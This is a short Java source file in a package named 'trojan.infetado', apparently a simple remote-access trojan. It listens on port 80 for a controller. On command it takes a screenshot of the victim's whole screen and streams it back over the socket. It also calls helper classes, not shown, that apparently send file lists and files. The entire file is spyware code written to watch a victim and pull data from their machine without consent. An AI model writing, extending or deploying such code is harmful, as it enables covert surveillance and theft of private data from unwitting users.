package trojan.infetado;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import javax.imageio.ImageIO;
import network.*;

public class Main {

    public static void main(String[] args) throws AWTException, IOException {

        final String pic = "takepic";
        final String off = "off";
        final String file = "filelist";

        DataInputStream din;

        ServerSocket servsock = new ServerSocket(80);
        Socket sock = servsock.accept();

        din = new DataInputStream(sock.getInputStream());

        String msg = "on";
        do {

            msg = din.readUTF();

            if (msg.equals(pic)) {

                Robot rob = new Robot();
                BufferedImage image = rob.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ImageIO.write(image, "jpg", new File("screenshot.jpg"));

                DataOutputStream dos = new DataOutputStream(sock.getOutputStream());
                FileInputStream fis = new FileInputStream("screenshot.jpg");
                byte[] buffer = new byte[4096];

                while (fis.read(buffer) > 0) {
                    dos.write(buffer);
                }

            } else if (msg.equals(file)) {
                SendArray sa = new SendArray();
                SendFile sf = new SendFile();
            }

        } while (!msg.equals(off));

    }

}
